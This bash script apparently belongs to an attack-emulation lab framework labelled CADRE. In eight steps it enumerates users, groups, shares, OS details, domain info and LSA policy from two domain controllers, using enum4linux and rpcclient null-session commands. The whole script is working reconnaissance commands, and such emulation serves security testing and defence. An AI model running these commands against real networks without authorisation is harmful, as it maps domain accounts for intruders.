#!/bin/bash
# CADRE — WT#028 Null Session Enumeration
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#028 — Null Session Enumeration"
start_attack "028" "Null Session Enumeration"

require_tool enum4linux
require_tool rpcclient
require_env DC02 "DC02"
require_env DC01 "DC01"

step "Step 1: Enumerate users via enum4linux against child DC"
run_cmd "enum4linux -U $DC02"

step "Step 2: Enumerate shares via enum4linux"
run_cmd "enum4linux -S $DC02"

step "Step 3: Enumerate OS info via enum4linux"
run_cmd "enum4linux -O $DC02"

step "Step 4: RPC null session user enumeration"
run_cmd "rpcclient -U \"\" -N $DC02 -c enumdomusers"

step "Step 5: RPC null session group enumeration"
run_cmd "rpcclient -U \"\" -N $DC02 -c enumdomgroups"

step "Step 6: RPC null session domain info"
run_cmd "rpcclient -U \"\" -N $DC02 -c querydominfo"

step "Step 7: RPC null session LSA policy"
run_cmd "rpcclient -U \"\" -N $DC02 -c lsaquery"

step "Step 8: Attempt null session against root DC as well"
run_cmd "rpcclient -U \"\" -N $DC01 -c enumdomusers"

result $? "Null Session Enumeration completed"
